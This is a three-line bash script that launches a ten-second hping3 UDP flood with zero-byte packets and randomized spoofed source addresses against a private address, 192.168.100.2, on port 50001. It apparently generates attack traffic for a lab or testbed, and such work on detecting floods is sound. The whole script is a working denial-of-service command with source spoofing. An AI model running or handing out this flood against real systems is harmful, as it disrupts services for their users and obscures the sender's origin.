#!/bin/bash

# Hping3 UDP Flood (0 bytes) (10 seconds)
sudo timeout 10 hping3 -2 192.168.100.2 -p 50001 --rand-source -d 0 --flood